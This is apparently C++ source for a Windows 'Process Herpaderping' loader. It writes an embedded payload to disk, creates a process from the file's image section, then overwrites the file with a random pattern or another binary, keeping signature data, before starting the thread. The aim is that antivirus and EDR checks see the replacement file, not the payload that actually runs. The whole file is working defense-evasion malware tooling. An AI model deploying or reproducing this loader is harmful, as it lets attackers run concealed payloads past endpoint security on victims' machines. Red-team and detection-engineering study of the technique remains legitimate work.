#include "pch.hpp"
#include "herpaderp.hpp"
#include "utils.hpp"

_Use_decl_annotations_
HRESULT Herpaderp::ExecuteProcess()
{
    HRESULT hr;

    std::wstring TargetFileName;
    hr = Utils::GetFileName(Herpaderp::_TargetFileName, TargetFileName);
    if (FAILED(hr))
    {
        REPORT_AND_RETURN_HR("Failed to retrieve the target filename", hr);
    }
    dprintf("Target File: \"%S\"", TargetFileName.c_str());

    DWORD sourceSize = sizeof(payload);
    PBYTE ptrPayload = payload;
    if (payload && sourceSize > 0)
    {
        dprintf("Payload size: %d (%p)", sourceSize, ptrPayload);
    }

    // To create target file with exclusive access, set shareMode to 0
    DWORD shareMode = (FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE);
    FileHandle targetHandle(TargetFileName, TRUE);
    targetHandle.get() = CreateFileW(TargetFileName.c_str(),
                                GENERIC_READ | GENERIC_WRITE,
                                shareMode,
                                nullptr,
                                CREATE_ALWAYS,
                                FILE_ATTRIBUTE_NORMAL,
                                nullptr);
    if (!targetHandle.valid())
    {
        REPORT_AND_RETURN_WIN32("Failed to create target file", GetLastError());
    }

    DWORD bytesWitten = 0;
    BOOL boolRet = WriteFile(
        targetHandle.get(),
        ptrPayload,
        sourceSize,
        &bytesWitten,
        nullptr
    );
    if (!boolRet)
    {
        REPORT_AND_RETURN_WIN32("Failed to copy source binary to target file", GetLastError());
    }

    boolRet = SetEndOfFile(targetHandle.get());
    if (!boolRet)
    {
        REPORT_AND_RETURN_WIN32("Failed to set EOF on target file", GetLastError());
    }

    dprintf("Copied source binary to target file");

    //
    // Map and create the target process. We'll make it all derpy in a moment...
    //
    AutoCloseHandle sectionHandle(TRUE);
    auto status = NtCreateSection(&sectionHandle.get(),
                                  SECTION_ALL_ACCESS,
                                  nullptr,
                                  nullptr,
                                  PAGE_READONLY,
                                  SEC_IMAGE,
                                  targetHandle.get());
    if (!NT_SUCCESS(status))
    {
        REPORT_AND_RETURN_NT("Failed to create target file image section", status);
    }

    dprintf("Created image section for target");

    ProcessHandle processHandle;
    status = NtCreateProcessEx(&processHandle.get(),
                               PROCESS_ALL_ACCESS,
                               nullptr,
                               NtCurrentProcess(),
                               PROCESS_CREATE_FLAGS_INHERIT_HANDLES,
                               sectionHandle.get(),
                               nullptr,
                               nullptr,
                               0);
    if (!NT_SUCCESS(status))
    {
        REPORT_AND_RETURN_NT("Failed to create process", status);
    }

    dprintf("Created process object, PID %lu", GetProcessId(processHandle.get()));

    //
    // Alright we have the process set up, we don't need the section.
    //
    sectionHandle.close();

    //
    // Go get the remote entry RVA to create a thread later on.
    //
   uint32_t imageEntryPointRva;
    hr = Utils::GetImageEntryPointRva(targetHandle.get(), imageEntryPointRva);
    if (FAILED(hr))
    {
        REPORT_AND_RETURN_HR("Failed to get target file image entry RVA", hr);
    }

    dprintf("Located target image entry RVA 0x%08x", imageEntryPointRva);

    PROCESS_BASIC_INFORMATION pbi{};
    status = NtQueryInformationProcess(processHandle.get(),
        ProcessBasicInformation,
        &pbi,
        sizeof(pbi),
        nullptr);
    if (!NT_SUCCESS(status))
    {
        REPORT_AND_RETURN_NT("Failed to query new process info", status);
    }

    PEB peb{};
    if (!ReadProcessMemory(processHandle.get(),
        pbi.PebBaseAddress,
        &peb,
        sizeof(peb),
        nullptr))
    {
        REPORT_AND_RETURN_WIN32("Failed to read remote process PEB", GetLastError());
    }
    void* remoteEntryPoint = Add2Ptr(peb.ImageBaseAddress, imageEntryPointRva);

    //
    // Herpaderp wants a pattern to use for obfuscation, set that up here.
    //
    std::span<const uint8_t> pattern;
    std::vector<uint8_t> patternBuffer;
    //
    // Setup a random pattern
    //
    patternBuffer.resize(Herpaderp::RandPatternLen);
    hr = BCryptGenRandom(nullptr,
        patternBuffer.data(),
        SCAST(ULONG)(patternBuffer.size()),
        BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    if (FAILED(hr))
    {
        REPORT_AND_RETURN_HR("Failed to generate random buffer", hr);
    }
    pattern = std::span<const uint8_t>(patternBuffer);

    //
    // Alright, if a file name has been provided in _ReplaceWithFileName,
    // we will overwrite the target binary with it. Otherwise, we will
    // overwrite the target binary with a pattern.
    //
    if (Utils::ShouldReplaceWithFile(Herpaderp::_ReplaceWithFileName))
    {
        std::wstring ReplaceWithFileName;
        hr = Utils::GetFileName(Herpaderp::_ReplaceWithFileName, ReplaceWithFileName);
        if (FAILED(hr))
        {
            REPORT_AND_RETURN_HR("Failed to retrieve the file name to replace with", hr);
        }
        dprintf("Replacing target with \"%S\"", ReplaceWithFileName.c_str());

        FileHandle replaceWithHandle(ReplaceWithFileName);
        replaceWithHandle.get() = CreateFileW(ReplaceWithFileName.c_str(),
                                               GENERIC_READ,
                                               FILE_SHARE_READ |
                                                   FILE_SHARE_WRITE |
                                                   FILE_SHARE_DELETE,
                                               nullptr,
                                               OPEN_EXISTING,
                                               FILE_ATTRIBUTE_NORMAL,
                                               nullptr);

        if (!replaceWithHandle.valid())
        {
            REPORT_AND_RETURN_WIN32("Failed to open replace with file", GetLastError());
        }

        //
        // Replace the bytes. We handle a failure here. We'll fix it up after.
        //
        hr = Utils::CopyFileByHandle(replaceWithHandle.get(), targetHandle.get());
        if (FAILED(hr))
        {
            if (hr != HRESULT_FROM_WIN32(ERROR_USER_MAPPED_FILE))
            {
                REPORT_AND_RETURN_HR("Failed to replace target file", hr);
            }

            //
            // This error occurs when trying to truncate a file that has a
            // user mapping open. In other words, the file we tried to replace
            // with was smaller than the original.
            // Let's fix up the replacement to hide the original bytes and 
            // retain any signer info.
            //
            dprintf("Fixing up target replacement, hiding original bytes and retaining any signature");

            uint64_t replaceWithSize;
            hr = Utils::GetFileSize(replaceWithHandle.get(), replaceWithSize);
            if (FAILED(hr))
            {
                REPORT_AND_RETURN_HR("Failed to get replace with file size", hr);
            }

            uint32_t bytesWritten = 0;
            hr = Utils::OverwriteFileAfterWithPattern(targetHandle.get(),
                                               replaceWithSize,
                                               pattern,
                                               bytesWritten);
            if (FAILED(hr))
            {
                dprintf("Failed to hide original file bytes, %S", Utils::FormatError(hr).c_str());
            }
            else
            {
                hr = Utils::ExtendFileSecurityDirectory(targetHandle.get(), bytesWritten);
                if (FAILED(hr))
                {
                    dprintf("Failed to retain file signature, %S", Utils::FormatError(hr).c_str());
                }
            }
        }

        replaceWithHandle.close();
    }
    else
    {
        dprintf("Overwriting target with pattern");

        hr = Utils::OverwriteFileContentsWithPattern(targetHandle.get(), pattern);
        if (FAILED(hr))
        {
            REPORT_AND_RETURN_HR("Failed to write pattern over file", hr);
        }
    }

    //
    // Alright, at this point the process is going to be derpy enough.
    // Do the work necessary to make it execute.
    //
    dprintf("Preparing target for execution");
    dprintf("Writing process parameters, remote PEB ProcessParameters 0x%p",
               Add2Ptr(pbi.PebBaseAddress, FIELD_OFFSET(PEB, ProcessParameters)));    
    
    hr = Utils::WriteRemoteProcessParameters(
                               processHandle.get(),
                               TargetFileName,
                               std::nullopt,
                               std::nullopt,
                               (L"\"" + TargetFileName + L"\""),
                               NtCurrentPeb()->ProcessParameters->Environment,
                               TargetFileName,
                               L"WinSta0\\Default",
                               std::nullopt,
                               std::nullopt);
    if (FAILED(hr))
    {
        REPORT_AND_RETURN_HR("Failed to write remote process parameters", hr);
    }

    //
    // Create the initial thread, when this first thread is inserted the
    // process create callback will fire in the kernel.
    //

    dprintf("Creating thread in process at entry point 0x%p", remoteEntryPoint);

    AutoCloseHandle threadHandle;
    status = NtCreateThreadEx(&threadHandle.get(),
                              THREAD_ALL_ACCESS,
                              nullptr,
                              processHandle.get(),
                              remoteEntryPoint,
                              nullptr,
                              0,
                              0,
                              0,
                              0,
                              nullptr);

    if (!NT_SUCCESS(status))
    {
        REPORT_AND_RETURN_NT("Failed to create remote thread, %S", status);
    }

    dprintf("Created thread, TID %lu", GetThreadId(threadHandle.get()));

    //
    // We're done with the target file handle. At this point the process 
    // create callback will have fired in the kernel.
    //
    targetHandle.close();

    //
    // Wait for the process to exit.
    //
    dprintf("Waiting for herpaderped process to exit");

    WaitForSingleObject(processHandle.get(), INFINITE);

    processHandle.terminate() = FALSE;

    DWORD targetExitCode = 0;
    GetExitCodeProcess(processHandle.get(), &targetExitCode);

    dprintf("Herpaderped process exited with code 0x%08x", targetExitCode);

    return S_OK;
}

int WINAPI wWinMain(_In_ HINSTANCE, _In_opt_ HINSTANCE, _In_ PWSTR, _In_ int)
{
    HRESULT hr;

#ifndef _WIN64
    //
    // Only 32-bit version of Windows 10 is affected
    // see https://bugs.chromium.org/p/project-zero/issues/detail?id=852
    //
    hr = Utils::IsBuggyKernel();
    if (FAILED(hr))
    {
        REPORT_AND_RETURN_HR("Checking kernel failed", hr);
    }
    if (hr == S_OK)
    {
        hr = E_ABORT;
        REPORT_AND_RETURN_HR("Kernel version on this OS is buggy and will BSOD... aborting", hr);
    }
    dprintf("Kernel is not one of the buggy one");
#endif

    hr = Herpaderp::ExecuteProcess();
    if (FAILED(hr))
    {
        REPORT_AND_RETURN_HR("Process Herpaderp failed", hr);
    }

    dprintf("Process Herpaderp succeeded");
    return EXIT_SUCCESS;
}
